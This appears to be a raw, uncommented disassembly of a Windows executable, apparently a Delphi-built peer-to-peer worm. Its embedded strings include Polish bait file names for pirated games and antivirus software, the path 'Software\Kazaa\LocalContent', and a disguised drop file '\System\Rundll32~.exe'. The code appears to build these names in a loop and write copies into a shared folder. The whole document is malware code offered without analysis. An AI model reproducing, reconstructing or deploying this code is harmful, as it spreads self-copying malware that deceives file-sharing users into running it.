  409a96:	e8 09 99 ff ff       	call   0x4033a4
  409a9b:	50                   	push   %eax
  409a9c:	8d 45 90             	lea    -0x70(%ebp),%eax
  409a9f:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  409aa4:	b9 00 01 00 00       	mov    $0x100,%ecx
  409aa9:	e8 8e 97 ff ff       	call   0x40323c
  409aae:	8d 45 90             	lea    -0x70(%ebp),%eax
  409ab1:	ba 48 9d 40 00       	mov    $0x409d48,%edx
  409ab6:	e8 a1 97 ff ff       	call   0x40325c
  409abb:	8b 45 90             	mov    -0x70(%ebp),%eax
  409abe:	e8 e1 98 ff ff       	call   0x4033a4
  409ac3:	50                   	push   %eax
  409ac4:	e8 23 ab ff ff       	call   0x4045ec
  409ac9:	8b 15 68 c6 40 00    	mov    0x40c668,%edx
  409acf:	8d 45 90             	lea    -0x70(%ebp),%eax
  409ad2:	e8 9d 96 ff ff       	call   0x403174
  409ad7:	8d 45 90             	lea    -0x70(%ebp),%eax
  409ada:	ba 2c 9d 40 00       	mov    $0x409d2c,%edx
  409adf:	e8 78 97 ff ff       	call   0x40325c
  409ae4:	8d 45 90             	lea    -0x70(%ebp),%eax
  409ae7:	50                   	push   %eax
  409ae8:	8d 45 8c             	lea    -0x74(%ebp),%eax
  409aeb:	8b 17                	mov    (%edi),%edx
  409aed:	e8 1a 97 ff ff       	call   0x40320c
  409af2:	8b 55 8c             	mov    -0x74(%ebp),%edx
  409af5:	58                   	pop    %eax
  409af6:	e8 61 97 ff ff       	call   0x40325c
  409afb:	8d 45 90             	lea    -0x70(%ebp),%eax
  409afe:	ba 38 9d 40 00       	mov    $0x409d38,%edx
  409b03:	e8 54 97 ff ff       	call   0x40325c
  409b08:	8b 45 90             	mov    -0x70(%ebp),%eax
  409b0b:	e8 94 98 ff ff       	call   0x4033a4
  409b10:	8b d0                	mov    %eax,%edx
  409b12:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409b15:	e8 f2 96 ff ff       	call   0x40320c
  409b1a:	8b 45 94             	mov    -0x6c(%ebp),%eax
  409b1d:	ba 20 00 00 00       	mov    $0x20,%edx
  409b22:	e8 a1 b3 ff ff       	call   0x404ec8
  409b27:	8b 15 68 c6 40 00    	mov    0x40c668,%edx
  409b2d:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409b30:	e8 3f 96 ff ff       	call   0x403174
  409b35:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409b38:	ba 2c 9d 40 00       	mov    $0x409d2c,%edx
  409b3d:	e8 1a 97 ff ff       	call   0x40325c
  409b42:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409b45:	50                   	push   %eax
  409b46:	8d 45 90             	lea    -0x70(%ebp),%eax
  409b49:	8b 17                	mov    (%edi),%edx
  409b4b:	e8 bc 96 ff ff       	call   0x40320c
  409b50:	8b 55 90             	mov    -0x70(%ebp),%edx
  409b53:	58                   	pop    %eax
  409b54:	e8 03 97 ff ff       	call   0x40325c
  409b59:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409b5c:	ba 38 9d 40 00       	mov    $0x409d38,%edx
  409b61:	e8 f6 96 ff ff       	call   0x40325c
  409b66:	8b 55 94             	mov    -0x6c(%ebp),%edx
  409b69:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  409b6e:	e8 16 a1 ff ff       	call   0x403c89
  409b73:	ba 00 ee 00 00       	mov    $0xee00,%edx
  409b78:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  409b7d:	e8 4e a4 ff ff       	call   0x403fd0
  409b82:	ba 01 00 00 00       	mov    $0x1,%edx
  409b87:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  409b8c:	e8 73 a4 ff ff       	call   0x404004
  409b91:	8b 77 04             	mov    0x4(%edi),%esi
  409b94:	85 f6                	test   %esi,%esi
  409b96:	7e 12                	jle    0x409baa
  409b98:	ba bc c7 40 00       	mov    $0x40c7bc,%edx
  409b9d:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  409ba2:	e8 b9 a4 ff ff       	call   0x404060
  409ba7:	4e                   	dec    %esi
  409ba8:	75 ee                	jne    0x409b98
  409baa:	b8 70 c6 40 00       	mov    $0x40c670,%eax
  409baf:	e8 78 a1 ff ff       	call   0x403d2c
  409bb4:	83 c7 08             	add    $0x8,%edi
  409bb7:	fe cb                	dec    %bl
  409bb9:	0f 85 44 fe ff ff    	jne    0x409a03
  409bbf:	33 c0                	xor    %eax,%eax
  409bc1:	5a                   	pop    %edx
  409bc2:	59                   	pop    %ecx
  409bc3:	59                   	pop    %ecx
  409bc4:	64 89 10             	mov    %edx,%fs:(%eax)
  409bc7:	68 e1 9b 40 00       	push   $0x409be1
  409bcc:	8d 45 8c             	lea    -0x74(%ebp),%eax
  409bcf:	ba 03 00 00 00       	mov    $0x3,%edx
  409bd4:	e8 27 95 ff ff       	call   0x403100
  409bd9:	c3                   	ret
  409bda:	e9 81 91 ff ff       	jmp    0x402d60
  409bdf:	eb eb                	jmp    0x409bcc
  409be1:	5f                   	pop    %edi
  409be2:	5e                   	pop    %esi
  409be3:	5b                   	pop    %ebx
  409be4:	8b e5                	mov    %ebp,%esp
  409be6:	5d                   	pop    %ebp
  409be7:	c3                   	ret
  409be8:	47                   	inc    %edi
  409be9:	54                   	push   %esp
  409bea:	41                   	inc    %ecx
  409beb:	20 53 61             	and    %dl,0x61(%ebx)
  409bee:	6e                   	outsb  %ds:(%esi),(%dx)
  409bef:	20 41 6e             	and    %al,0x6e(%ecx)
  409bf2:	64 72 65             	fs jb  0x409c5a
  409bf5:	61                   	popa
  409bf6:	73 20                	jae    0x409c18
  409bf8:	43                   	inc    %ebx
  409bf9:	72 61                	jb     0x409c5c
  409bfb:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  409bfe:	00 00                	add    %al,(%eax)
  409c00:	4e                   	dec    %esi
  409c01:	6f                   	outsl  %ds:(%esi),(%dx)
  409c02:	72 74                	jb     0x409c78
  409c04:	6f                   	outsl  %ds:(%esi),(%dx)
  409c05:	6e                   	outsb  %ds:(%esi),(%dx)
  409c06:	20 41 6e             	and    %al,0x6e(%ecx)
  409c09:	74 79                	je     0x409c84
  409c0b:	56                   	push   %esi
  409c0c:	69 72 75 73 20 32 30 	imul   $0x30322073,0x75(%edx),%esi
  409c13:	30 35 20 66 75 6c    	xor    %dh,0x6c756620
  409c19:	6c                   	insb   (%dx),%es:(%edi)
  409c1a:	00 00                	add    %al,(%eax)
  409c1c:	4d                   	dec    %ebp
  409c1d:	6b 73 5f 76          	imul   $0x76,0x5f(%ebx),%esi
  409c21:	69 72 20 32 30 30 35 	imul   $0x35303032,0x20(%edx),%esi
  409c28:	00 00                	add    %al,(%eax)
  409c2a:	00 00                	add    %al,(%eax)
  409c2c:	48                   	dec    %eax
  409c2d:	61                   	popa
  409c2e:	6c                   	insb   (%dx),%es:(%edi)
  409c2f:	66 20 4c 69 66       	data16 and %cl,0x66(%ecx,%ebp,2)
  409c34:	65 20 32             	and    %dh,%gs:(%edx)
  409c37:	20 43 72             	and    %al,0x72(%ebx)
  409c3a:	61                   	popa
  409c3b:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  409c3e:	2d 20 6d 75 6c       	sub    $0x6c756d20,%eax
  409c43:	74 69                	je     0x409cae
  409c45:	70 6c                	jo     0x409cb3
  409c47:	61                   	popa
  409c48:	79 65                	jns    0x409caf
  409c4a:	72 00                	jb     0x409c4c
  409c4c:	54                   	push   %esp
  409c4d:	68 65 20 53 69       	push   $0x69532065
  409c52:	6d                   	insl   (%dx),%es:(%edi)
  409c53:	73 20                	jae    0x409c75
  409c55:	32 20                	xor    (%eax),%ah
  409c57:	63 72 61             	arpl   %esi,0x61(%edx)
  409c5a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  409c5d:	00 00                	add    %al,(%eax)
  409c5f:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  409c63:	65 63 74 78 31       	arpl   %esi,%gs:0x31(%eax,%edi,2)
  409c68:	30 20                	xor    %ah,(%eax)
  409c6a:	76 32                	jbe    0x409c9e
  409c6c:	2e 33 20             	xor    %cs:(%eax),%esp
  409c6f:	66 75 6c             	data16 jne 0x409cde
  409c72:	6c                   	insb   (%dx),%es:(%edi)
  409c73:	76 65                	jbe    0x409cda
  409c75:	72 73                	jb     0x409cea
  409c77:	69 6f 6e 20 50 4c 00 	imul   $0x4c5020,0x6e(%edi),%ebp
  409c7e:	00 00                	add    %al,(%eax)
  409c80:	47                   	inc    %edi
  409c81:	61                   	popa
  409c82:	64 75 52             	fs jne 0x409cd7
  409c85:	65 61                	gs popa
  409c87:	64 65 72 20          	fs gs jb 0x409cab
  409c8b:	33 2e                	xor    (%esi),%ebp
  409c8d:	35 00 00 50 61       	xor    $0x61500000,%eax
  409c92:	72 74                	jb     0x409d08
  409c94:	69 74 69 6f 6e 20 4d 	imul   $0x614d206e,0x6f(%ecx,%ebp,2),%esi
  409c9b:	61 
  409c9c:	67 69 63 20 38 2e 36 	imul   $0x362e38,0x20(%bp,%di),%esp
  409ca3:	00 
  409ca4:	50                   	push   %eax
  409ca5:	61                   	popa
  409ca6:	72 74                	jb     0x409d1c
  409ca8:	69 74 69 6f 6e 20 4d 	imul   $0x614d206e,0x6f(%ecx,%ebp,2),%esi
  409caf:	61 
  409cb0:	67 69 63 20 39 00 00 	imul   $0x39,0x20(%bp,%di),%esp
  409cb7:	00 
  409cb8:	48                   	dec    %eax
  409cb9:	61                   	popa
  409cba:	6c                   	insb   (%dx),%es:(%edi)
  409cbb:	66 20 4c 69 66       	data16 and %cl,0x66(%ecx,%ebp,2)
  409cc0:	65 20 32             	and    %dh,%gs:(%edx)
  409cc3:	20 64 6f 64          	and    %ah,0x64(%edi,%ebp,2)
  409cc7:	61                   	popa
  409cc8:	74 65                	je     0x409d2f
  409cca:	6b 00 52             	imul   $0x52,(%eax),%eax
  409ccd:	6f                   	outsl  %ds:(%esi),(%dx)
  409cce:	6c                   	insb   (%dx),%es:(%edi)
  409ccf:	6c                   	insb   (%dx),%es:(%edi)
  409cd0:	65 72 20             	gs jb  0x409cf3
  409cd3:	43                   	inc    %ebx
  409cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  409cd5:	61                   	popa
  409cd6:	73 74                	jae    0x409d4c
  409cd8:	65 72 20             	gs jb  0x409cfb
  409cdb:	54                   	push   %esp
  409cdc:	79 63                	jns    0x409d41
  409cde:	6f                   	outsl  %ds:(%esi),(%dx)
  409cdf:	6f                   	outsl  %ds:(%esi),(%dx)
  409ce0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ce1:	20 33                	and    %dh,(%ebx)
  409ce3:	20 63 72             	and    %ah,0x72(%ebx)
  409ce6:	61                   	popa
  409ce7:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  409cea:	00 00                	add    %al,(%eax)
  409cec:	54                   	push   %esp
  409ced:	68 65 20 53 69       	push   $0x69532065
  409cf2:	6d                   	insl   (%dx),%es:(%edi)
  409cf3:	73 20                	jae    0x409d15
  409cf5:	32 20                	xor    (%eax),%ah
  409cf7:	2d 20 63 72 61       	sub    $0x61726320,%eax
  409cfc:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  409cff:	6e                   	outsb  %ds:(%esi),(%dx)
  409d00:	61                   	popa
  409d01:	20 62 75             	and    %ah,0x75(%edx)
  409d04:	64 6f                	outsl  %fs:(%esi),(%dx)
  409d06:	77 61                	ja     0x409d69
  409d08:	6e                   	outsb  %ds:(%esi),(%dx)
  409d09:	69 65 00 52 65 61 64 	imul   $0x64616552,0x0(%ebp),%esp
  409d10:	4b                   	dec    %ebx
  409d11:	65 79 73             	gs jns 0x409d87
  409d14:	20 2d 20 4d 6b 73    	and    %ch,0x736b4d20
  409d1a:	5f                   	pop    %edi
  409d1b:	76 69                	jbe    0x409d86
  409d1d:	72 20                	jb     0x409d3f
  409d1f:	32 30                	xor    (%eax),%dh
  409d21:	30 35 00 ff ff ff    	xor    %dh,0xffffff00
  409d27:	ff 01                	incl   (%ecx)
  409d29:	00 00                	add    %al,(%eax)
  409d2b:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  409d2f:	00 ff                	add    %bh,%bh
  409d31:	ff                   	(bad)
  409d32:	ff                   	(bad)
  409d33:	ff 04 00             	incl   (%eax,%eax,1)
  409d36:	00 00                	add    %al,(%eax)
  409d38:	2e 65 78 65          	cs js,pn 0x409da1
  409d3c:	00 00                	add    %al,(%eax)
  409d3e:	00 00                	add    %al,(%eax)
  409d40:	ff                   	(bad)
  409d41:	ff                   	(bad)
  409d42:	ff                   	(bad)
  409d43:	ff 15 00 00 00 5c    	call   *0x5c000000
  409d49:	53                   	push   %ebx
  409d4a:	79 73                	jns    0x409dbf
  409d4c:	74 65                	je     0x409db3
  409d4e:	6d                   	insl   (%dx),%es:(%edi)
  409d4f:	5c                   	pop    %esp
  409d50:	52                   	push   %edx
  409d51:	75 6e                	jne    0x409dc1
  409d53:	64 6c                	fs insb (%dx),%es:(%edi)
  409d55:	6c                   	insb   (%dx),%es:(%edi)
  409d56:	33 32                	xor    (%edx),%esi
  409d58:	7e 2e                	jle    0x409d88
  409d5a:	65 78 65             	gs js  0x409dc2
  409d5d:	00 00                	add    %al,(%eax)
  409d5f:	00 55 8b             	add    %dl,-0x75(%ebp)
  409d62:	ec                   	in     (%dx),%al
  409d63:	6a 00                	push   $0x0
  409d65:	53                   	push   %ebx
  409d66:	56                   	push   %esi
  409d67:	57                   	push   %edi
  409d68:	33 c0                	xor    %eax,%eax
  409d6a:	55                   	push   %ebp
  409d6b:	68 e2 9e 40 00       	push   $0x409ee2
  409d70:	64 ff 30             	push   %fs:(%eax)
  409d73:	64 89 20             	mov    %esp,%fs:(%eax)
  409d76:	33 c0                	xor    %eax,%eax
  409d78:	55                   	push   %ebp
  409d79:	68 b4 9e 40 00       	push   $0x409eb4
  409d7e:	64 ff 30             	push   %fs:(%eax)
  409d81:	64 89 20             	mov    %esp,%fs:(%eax)
  409d84:	b2 01                	mov    $0x1,%dl
  409d86:	b8 50 93 40 00       	mov    $0x409350,%eax
  409d8b:	e8 74 f6 ff ff       	call   0x409404
  409d90:	8b d8                	mov    %eax,%ebx
  409d92:	33 c9                	xor    %ecx,%ecx
  409d94:	ba f8 9e 40 00       	mov    $0x409ef8,%edx
  409d99:	8b c3                	mov    %ebx,%eax
  409d9b:	e8 58 f7 ff ff       	call   0x4094f8
  409da0:	3c 01                	cmp    $0x1,%al
  409da2:	0f 85 f4 00 00 00    	jne    0x409e9c
  409da8:	c6 05 6c c6 40 00 01 	movb   $0x1,0x40c66c
  409daf:	ba 1c 9f 40 00       	mov    $0x409f1c,%edx
  409db4:	8b c3                	mov    %ebx,%eax
  409db6:	e8 5d fa ff ff       	call   0x409818
  409dbb:	84 c0                	test   %al,%al
  409dbd:	75 70                	jne    0x409e2f
  409dbf:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409dc2:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  409dc7:	b9 00 01 00 00       	mov    $0x100,%ecx
  409dcc:	e8 6b 94 ff ff       	call   0x40323c
  409dd1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409dd4:	ba 2c 9f 40 00       	mov    $0x409f2c,%edx
  409dd9:	e8 7e 94 ff ff       	call   0x40325c
  409dde:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409de1:	e8 be 95 ff ff       	call   0x4033a4
  409de6:	8b d0                	mov    %eax,%edx
  409de8:	b8 68 c6 40 00       	mov    $0x40c668,%eax
  409ded:	e8 1a 94 ff ff       	call   0x40320c
  409df2:	a1 68 c6 40 00       	mov    0x40c668,%eax
  409df7:	e8 ac 88 ff ff       	call   0x4026a8
  409dfc:	e8 8f 88 ff ff       	call   0x402690
  409e01:	85 c0                	test   %eax,%eax
  409e03:	ba 44 9f 40 00       	mov    $0x409f44,%edx
  409e08:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409e0b:	e8 64 93 ff ff       	call   0x403174
  409e10:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409e13:	8b 15 68 c6 40 00    	mov    0x40c668,%edx
  409e19:	e8 3e 94 ff ff       	call   0x40325c
  409e1e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409e21:	ba 1c 9f 40 00       	mov    $0x409f1c,%edx
  409e26:	8b c3                	mov    %ebx,%eax
  409e28:	e8 6b f8 ff ff       	call   0x409698
  409e2d:	eb 74                	jmp    0x409ea3
  409e2f:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  409e32:	ba 1c 9f 40 00       	mov    $0x409f1c,%edx
  409e37:	8b c3                	mov    %ebx,%eax
  409e39:	e8 86 f8 ff ff       	call   0x4096c4
  409e3e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409e41:	e8 5e 95 ff ff       	call   0x4033a4
  409e46:	8b d0                	mov    %eax,%edx
  409e48:	b8 68 c6 40 00       	mov    $0x40c668,%eax
  409e4d:	e8 ba 93 ff ff       	call   0x40320c
  409e52:	b8 68 c6 40 00       	mov    $0x40c668,%eax
  409e57:	b9 07 00 00 00       	mov    $0x7,%ecx
  409e5c:	ba 01 00 00 00       	mov    $0x1,%edx
  409e61:	e8 be 95 ff ff       	call   0x403424
  409e66:	8b 15 68 c6 40 00    	mov    0x40c668,%edx
  409e6c:	b8 54 9f 40 00       	mov    $0x409f54,%eax
  409e71:	e8 f6 95 ff ff       	call   0x40346c
  409e76:	85 c0                	test   %eax,%eax
  409e78:	75 0f                	jne    0x409e89
  409e7a:	b8 68 c6 40 00       	mov    $0x40c668,%eax
  409e7f:	ba 68 9f 40 00       	mov    $0x409f68,%edx
  409e84:	e8 d3 93 ff ff       	call   0x40325c
  409e89:	a1 68 c6 40 00       	mov    0x40c668,%eax
  409e8e:	e8 15 88 ff ff       	call   0x4026a8
  409e93:	e8 f8 87 ff ff       	call   0x402690
  409e98:	85 c0                	test   %eax,%eax
  409e9a:	eb 07                	jmp    0x409ea3
  409e9c:	c6 05 6c c6 40 00 00 	movb   $0x0,0x40c66c
  409ea3:	8b c3                	mov    %ebx,%eax
  409ea5:	e8 22 8b ff ff       	call   0x4029cc
  409eaa:	33 c0                	xor    %eax,%eax
  409eac:	5a                   	pop    %edx
  409ead:	59                   	pop    %ecx
  409eae:	59                   	pop    %ecx
  409eaf:	64 89 10             	mov    %edx,%fs:(%eax)
  409eb2:	eb 0a                	jmp    0x409ebe
  409eb4:	e9 e3 8d ff ff       	jmp    0x402c9c
  409eb9:	e8 ca 8f ff ff       	call   0x402e88
  409ebe:	80 3d 6c c6 40 00 01 	cmpb   $0x1,0x40c66c
  409ec5:	75 05                	jne    0x409ecc
  409ec7:	e8 48 fa ff ff       	call   0x409914
  409ecc:	33 c0                	xor    %eax,%eax
  409ece:	5a                   	pop    %edx
  409ecf:	59                   	pop    %ecx
  409ed0:	59                   	pop    %ecx
  409ed1:	64 89 10             	mov    %edx,%fs:(%eax)
  409ed4:	68 e9 9e 40 00       	push   $0x409ee9
  409ed9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409edc:	e8 ff 91 ff ff       	call   0x4030e0
  409ee1:	c3                   	ret
  409ee2:	e9 79 8e ff ff       	jmp    0x402d60
  409ee7:	eb f0                	jmp    0x409ed9
  409ee9:	5f                   	pop    %edi
  409eea:	5e                   	pop    %esi
  409eeb:	5b                   	pop    %ebx
  409eec:	59                   	pop    %ecx
  409eed:	5d                   	pop    %ebp
  409eee:	c3                   	ret
  409eef:	00 ff                	add    %bh,%bh
  409ef1:	ff                   	(bad)
  409ef2:	ff                   	(bad)
  409ef3:	ff 1b                	lcall  *(%ebx)
  409ef5:	00 00                	add    %al,(%eax)
  409ef7:	00 53 6f             	add    %dl,0x6f(%ebx)
  409efa:	66 74 77             	data16 je 0x409f74
  409efd:	61                   	popa
  409efe:	72 65                	jb     0x409f65
  409f00:	5c                   	pop    %esp
  409f01:	4b                   	dec    %ebx
  409f02:	61                   	popa
  409f03:	7a 61                	jp     0x409f66
  409f05:	61                   	popa
  409f06:	5c                   	pop    %esp
  409f07:	4c                   	dec    %esp
  409f08:	6f                   	outsl  %ds:(%esi),(%dx)
  409f09:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409f0c:	43                   	inc    %ebx
  409f0d:	6f                   	outsl  %ds:(%esi),(%dx)
  409f0e:	6e                   	outsb  %ds:(%esi),(%dx)
  409f0f:	74 65                	je     0x409f76
  409f11:	6e                   	outsb  %ds:(%esi),(%dx)
  409f12:	74 00                	je     0x409f14
  409f14:	ff                   	(bad)
  409f15:	ff                   	(bad)
  409f16:	ff                   	(bad)
  409f17:	ff 04 00             	incl   (%eax,%eax,1)
  409f1a:	00 00                	add    %al,(%eax)
  409f1c:	44                   	inc    %esp
  409f1d:	69 72 30 00 00 00 00 	imul   $0x0,0x30(%edx),%esi
  409f24:	ff                   	(bad)
  409f25:	ff                   	(bad)
  409f26:	ff                   	(bad)
  409f27:	ff 0c 00             	decl   (%eax,%eax,1)
  409f2a:	00 00                	add    %al,(%eax)
  409f2c:	5c                   	pop    %esp
  409f2d:	50                   	push   %eax
  409f2e:	72 6f                	jb     0x409f9f
  409f30:	67 72 61             	addr16 jb 0x409f94
  409f33:	6d                   	insl   (%dx),%es:(%edi)
  409f34:	79 5f                	jns    0x409f95
  409f36:	4d                   	dec    %ebp
  409f37:	58                   	pop    %eax
  409f38:	00 00                	add    %al,(%eax)
  409f3a:	00 00                	add    %al,(%eax)
  409f3c:	ff                   	(bad)
  409f3d:	ff                   	(bad)
  409f3e:	ff                   	(bad)
  409f3f:	ff 07                	incl   (%edi)
  409f41:	00 00                	add    %al,(%eax)
  409f43:	00 30                	add    %dh,(%eax)
  409f45:	31 32                	xor    %esi,(%edx)
  409f47:	33 34 35 3a 00 ff ff 	xor    -0xffc6(,%esi,1),%esi
  409f4e:	ff                   	(bad)
  409f4f:	ff 0b                	decl   (%ebx)
  409f51:	00 00                	add    %al,(%eax)
  409f53:	00 50 72             	add    %dl,0x72(%eax)
  409f56:	6f                   	outsl  %ds:(%esi),(%dx)
  409f57:	67 72 61             	addr16 jb 0x409fbb
  409f5a:	6d                   	insl   (%dx),%es:(%edi)
  409f5b:	79 5f                	jns    0x409fbc
  409f5d:	4d                   	dec    %ebp
  409f5e:	58                   	pop    %eax
  409f5f:	00 ff                	add    %bh,%bh
  409f61:	ff                   	(bad)
  409f62:	ff                   	(bad)
  409f63:	ff 08                	decl   (%eax)
  409f65:	00 00                	add    %al,(%eax)
  409f67:	00 5c 50 72          	add    %bl,0x72(%eax,%edx,2)
  409f6b:	6f                   	outsl  %ds:(%esi),(%dx)
  409f6c:	67 5f                	addr16 pop %edi
  409f6e:	4d                   	dec    %ebp
  409f6f:	58                   	pop    %eax
  409f70:	00 00                	add    %al,(%eax)
  409f72:	00 00                	add    %al,(%eax)
  409f74:	55                   	push   %ebp
  409f75:	8b ec                	mov    %esp,%ebp
  409f77:	81 c4 98 fe ff ff    	add    $0xfffffe98,%esp
  409f7d:	53                   	push   %ebx
  409f7e:	56                   	push   %esi
  409f7f:	57                   	push   %edi
  409f80:	33 d2                	xor    %edx,%edx
  409f82:	89 95 a0 fe ff ff    	mov    %edx,-0x160(%ebp)
  409f88:	89 95 9c fe ff ff    	mov    %edx,-0x164(%ebp)
  409f8e:	89 95 98 fe ff ff    	mov    %edx,-0x168(%ebp)
  409f94:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409f97:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409f9a:	e8 f5 93 ff ff       	call   0x403394
  409f9f:	8d 85 a4 fe ff ff    	lea    -0x15c(%ebp),%eax
  409fa5:	ba b4 46 40 00       	mov    $0x4046b4,%edx
  409faa:	e8 69 95 ff ff       	call   0x403518
  409faf:	33 c0                	xor    %eax,%eax
  409fb1:	55                   	push   %ebp
  409fb2:	68 2b a5 40 00       	push   $0x40a52b
  409fb7:	64 ff 30             	push   %fs:(%eax)
  409fba:	64 89 20             	mov    %esp,%fs:(%eax)
  409fbd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  409fc0:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  409fc6:	e8 a9 91 ff ff       	call   0x403174
  409fcb:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  409fd1:	ba 44 a5 40 00       	mov    $0x40a544,%edx
  409fd6:	e8 81 92 ff ff       	call   0x40325c
  409fdb:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  409fe1:	8d 8d a4 fe ff ff    	lea    -0x15c(%ebp),%ecx
  409fe7:	ba 3f 00 00 00       	mov    $0x3f,%edx
  409fec:	e8 63 af ff ff       	call   0x404f54
  409ff1:	85 c0                	test   %eax,%eax
  409ff3:	0f 85 f1 04 00 00    	jne    0x40a4ea
  409ff9:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  409fff:	ba 50 a5 40 00       	mov    $0x40a550,%edx
  40a004:	e8 e7 92 ff ff       	call   0x4032f0
  40a009:	0f 84 a0 01 00 00    	je     0x40a1af
  40a00f:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a015:	ba 5c a5 40 00       	mov    $0x40a55c,%edx
  40a01a:	e8 d1 92 ff ff       	call   0x4032f0
  40a01f:	0f 84 8a 01 00 00    	je     0x40a1af
  40a025:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a028:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a02e:	e8 41 91 ff ff       	call   0x403174
  40a033:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  40a039:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40a03f:	e8 18 92 ff ff       	call   0x40325c
  40a044:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a04a:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a050:	e8 0f f8 ff ff       	call   0x409864
  40a055:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a05b:	50                   	push   %eax
  40a05c:	8d 85 98 fe ff ff    	lea    -0x168(%ebp),%eax
  40a062:	ba 64 c5 40 00       	mov    $0x40c564,%edx
  40a067:	b9 00 01 00 00       	mov    $0x100,%ecx
  40a06c:	e8 cb 91 ff ff       	call   0x40323c
  40a071:	8b 85 98 fe ff ff    	mov    -0x168(%ebp),%eax
  40a077:	8d 95 9c fe ff ff    	lea    -0x164(%ebp),%edx
  40a07d:	e8 e2 f7 ff ff       	call   0x409864
  40a082:	8b 85 9c fe ff ff    	mov    -0x164(%ebp),%eax
  40a088:	5a                   	pop    %edx
  40a089:	e8 de 93 ff ff       	call   0x40346c
  40a08e:	85 c0                	test   %eax,%eax
  40a090:	0f 85 19 01 00 00    	jne    0x40a1af
  40a096:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a09c:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a0a2:	e8 bd f7 ff ff       	call   0x409864
  40a0a7:	8b 95 a0 fe ff ff    	mov    -0x160(%ebp),%edx
  40a0ad:	b8 68 a5 40 00       	mov    $0x40a568,%eax
  40a0b2:	e8 b5 93 ff ff       	call   0x40346c
  40a0b7:	85 c0                	test   %eax,%eax
  40a0b9:	0f 85 f0 00 00 00    	jne    0x40a1af
  40a0bf:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a0c5:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a0cb:	e8 94 f7 ff ff       	call   0x409864
  40a0d0:	8b 95 a0 fe ff ff    	mov    -0x160(%ebp),%edx
  40a0d6:	b8 74 a5 40 00       	mov    $0x40a574,%eax
  40a0db:	e8 8c 93 ff ff       	call   0x40346c
  40a0e0:	85 c0                	test   %eax,%eax
  40a0e2:	0f 85 c7 00 00 00    	jne    0x40a1af
  40a0e8:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a0ee:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a0f4:	e8 6b f7 ff ff       	call   0x409864
  40a0f9:	8b 95 a0 fe ff ff    	mov    -0x160(%ebp),%edx
  40a0ff:	b8 84 a5 40 00       	mov    $0x40a584,%eax
  40a104:	e8 63 93 ff ff       	call   0x40346c
  40a109:	85 c0                	test   %eax,%eax
  40a10b:	0f 85 9e 00 00 00    	jne    0x40a1af
  40a111:	8d 95 a0 fe ff ff    	lea    -0x160(%ebp),%edx
  40a117:	b8 94 a5 40 00       	mov    $0x40a594,%eax
  40a11c:	e8 43 f7 ff ff       	call   0x409864
  40a121:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  40a127:	50                   	push   %eax
  40a128:	8d 95 9c fe ff ff    	lea    -0x164(%ebp),%edx
  40a12e:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40a134:	e8 2b f7 ff ff       	call   0x409864
  40a139:	8b 95 9c fe ff ff    	mov    -0x164(%ebp),%edx
  40a13f:	58                   	pop    %eax
  40a140:	e8 ab 91 ff ff       	call   0x4032f0
  40a145:	74 68                	je     0x40a1af
  40a147:	8b 9d ac fe ff ff    	mov    -0x154(%ebp),%ebx
  40a14d:	83 fb 10             	cmp    $0x10,%ebx
  40a150:	74 1e                	je     0x40a170
  40a152:	83 fb 11             	cmp    $0x11,%ebx
  40a155:	74 19                	je     0x40a170
  40a157:	83 fb 30             	cmp    $0x30,%ebx
  40a15a:	74 14                	je     0x40a170
  40a15c:	83 fb 31             	cmp    $0x31,%ebx
  40a15f:	74 0f                	je     0x40a170
  40a161:	83 fb 12             	cmp    $0x12,%ebx
  40a164:	74 0a                	je     0x40a170
